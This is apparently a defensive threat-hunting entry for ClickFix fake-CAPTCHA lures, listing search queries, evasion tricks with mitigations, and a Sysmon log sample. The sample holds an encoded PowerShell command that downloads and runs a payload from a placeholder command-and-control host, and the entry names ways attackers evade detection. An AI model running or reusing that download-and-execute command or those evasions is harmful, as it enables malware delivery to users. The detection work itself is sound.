OsintSources:
- Platform: URLScan
  Query: 'page.body:navigator.clipboard.writeText AND page.body:"Verify"'
  URL: https://urlscan.io/search/#page.body%3Anavigator.clipboard.writeText%20AND%20page.body%3A%22Verify%22
  Notes: 'Clipboard writeText API co-occurring with "Verify" text — catches CAPTCHA-themed ClickFix lures
    across Cloudflare and reCAPTCHA impersonation variants.'
- Platform: URLScan
  Query: 'page.body:"I am not a robot" AND page.body:navigator.clipboard'
  URL: https://urlscan.io/search/#page.body%3A%22I%20am%20not%20a%20robot%22%20AND%20page.body%3Anavigator.clipboard
  Notes: 'Fake CAPTCHA pages that write to the clipboard — the canonical ClickFix lure. High precision
    across reCAPTCHA and Cloudflare impersonation variants.'
- Platform: URLScan
  Query: 'page.body:navigator.clipboard AND page.body:"Win+R"'
  URL: https://urlscan.io/search/#page.body%3Anavigator.clipboard%20AND%20page.body%3A%22Win%2BR%22
  Notes: 'Pages with clipboard API AND Run dialog instruction — the execution step unique to ClickFix.
    Swap "Win+R" for "PowerShell" or "Terminal" to find TerminalFix variants.'
- Platform: VirusTotal Intelligence
  Query: behavior_processes:"nslookup.exe" tag:powershell
  URL: https://www.virustotal.com/gui/search/behavior_processes%3A%22nslookup.exe%22%20tag%3Apowershell
  Notes: Requires VT Intelligence subscription; targets DNS-based ClickFix staging where nslookup retrieves the payload instead
    of direct HTTP download.
- Platform: VirusTotal Intelligence
  Query: behavior_processes:"powershell.exe" behavior_command_line:"-enc" tag:dropper
  URL: https://www.virustotal.com/gui/search/behavior_processes%3A%22powershell.exe%22%20behavior_command_line%3A%22-enc%22%20tag%3Adropper
  Notes: Requires VT Intelligence subscription; finds encoded PowerShell droppers consistent with ClickFix payload obfuscation
    patterns.
KnownBypasses:
- Bypass: Hosting payload on legitimate platforms (Pastebin, GitHub, cloud storage)
  Mitigation: Apply web filtering by content type and execution context rather than by hosting domain.
- Bypass: macOS/Linux native interpreters (osascript, bash, zsh) evade Windows-only detection logic
  Mitigation: Enforce application allowlisting on macOS and restrict terminal access for non-technical users.
RawLogs:
- Type: Sysmon
  EventId: 1
  Source: Microsoft-Windows-Sysmon/Operational
  Description: PowerShell spawned by Chrome with encoded command — the core ClickFix indicator
  MatchedRules:
  - Hunt
  - Analyst
  Sample: 'EventID: 1 (Process Create)

    UtcTime: 2024-11-03 14:52:17.442

    ProcessGuid: {b2c3d4e5-2345-6789-bcde-f01234567890}

    ProcessId: 7124

    Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

    CommandLine: powershell.exe -NonInteractive -NoProfile -EncodedCommand aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjADIALQBkAG8AbQBhAGkAbgAvAHAAYQB5AGwAbwBhAGQAJwApAA==

    CurrentDirectory: C:\Users\jsmith\

    ParentProcessId: 6892

    ParentImage: C:\Program Files\Google\Chrome\Application\chrome.exe

    ParentCommandLine: "C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer

    # Key signal: ParentImage=chrome.exe + CommandLine contains -EncodedCommand

    # User copied "fix" command from malicious page, pasted into Run dialog

    '
